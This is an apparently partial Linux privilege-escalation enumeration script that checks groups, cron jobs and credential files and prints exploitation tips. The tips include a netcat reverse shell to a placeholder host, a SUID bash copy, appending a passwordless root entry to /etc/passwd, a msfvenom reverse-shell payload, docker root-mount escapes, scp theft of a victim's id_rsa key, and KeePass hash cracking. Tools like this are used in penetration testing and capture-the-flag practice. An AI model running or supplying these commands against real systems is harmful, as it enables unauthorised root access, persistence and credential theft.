...
echo -e "\n${BLUE}[+] Are we in a restricted shell?${XX}"
    env | grep -i "rbash\|chroot"
        ...
        echo -e "\t║    https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-SGIDe.pdf                           ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
...
echo -e "\n${BLUE}[+] User ID:${XX}"
    id 2>/dev/null 
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Sometimes, the user may be a part of a vulnerable group such as: lxd/lxc,Docker, Wheel, Shadow, Disk, Video. Every  ║"
        echo -e "\t║group worths Googling for exploit.                                                                                  ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] User ID group possible escap:${XX}"
    id | grep --color=always -i "docker\|lxd\|sambashare\|lpadmin\|adm\|sudo\|video\|disk\|disk\|shadow" 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Docker group:                                                                                                       ║"
        echo -e "\t║Run:                                                                                                                ║"
        echo -e "\t║    A) docker run -v /root:/mnt -it alpine                                                                          ║"
        echo -e "\t║    B) docker ps -a                                                                                                 ║"
        echo -e "\t║       docker start wizardly_lovelace                                                                               ║"
        echo -e "\t║       docker exec -it wizardly_lovelace /bin/sh                                                                    ║"
        echo -e "\t║    C) docker run -v /root:/mnt -it 965                                                                             ║"
...
echo -e "\n${BLUE}[+] Scheduled Jobs:${XX}"
    cat /etc/crontab 2>/dev/null
        ...
        echo -e "\t║  ${RED}echo 'm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc a.a.a.a 80 >/tmp/f' >> file${XX}                             ║"
        echo -e "\t║  ${RED}echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> file${XX}                                                          ║"
        echo -e "\t║  ${RED}echo 'echo root::0:0:root:/root:/bin/bash >> /etc/passwd' >> file${XX}                                                  ║"
        echo -e "\t║  ${RED}From attacker PC: msfvenom -p cmd/unix/reverse_python lhost=a.a.a.a lport=80 (echo it to the file)${XX}                 ║"
        echo -e "\t║${RED}You can use any Reverse Shell payload from payloadallthethings in GitHub${XX}                                             ║"
        echo -e "\t╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
...
echo -e "\n${BLUE}[+] id_rsa:${XX}"
    find / -iname id_rsa 2>/dev/null
        ...
        echo -e "\t║${RED}Exploit:${XX}                                                                                                            ║"
        echo -e "\t║  ${RED}scp -P 22 username@v.v.v.v:/path/of/victim_rsa /path/to/attacker${XX}                                                  ║"
...
echo -e "\n${BLUE}[+] .GPG Files:${XX}"
    find / -iname *.gpg -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
        ...
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] .pyc Files:${XX}"
    find / -iname *.pyc -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/var/"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
...
echo -e "[*] .kdb files:"
    find / -iname *.kdb -type f 2>/dev/null
        ...
        echo -e "\t║${RED}Exploit:${XX}                                                                                    ║"
        echo -e "\t║  ${RED}Get the file to your local PC${XX}                                                             ║"
        echo -e "\t║  ${RED}keepass2john file.kdbx > hash${XX}                                                             ║"
        echo -e "\t║  ${RED}john hash${XX}                                                                                 ║" 
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
...
echo -e "\n${BLUE}[+] RDP Profiles:${XX}"
    ...
    find / -iname *.rdp -type f 2>/dev/null --color=always
        ...
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Chkrootkit:${XX}"
    grep -rnw -i "ROOTDIR is" --color=always 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
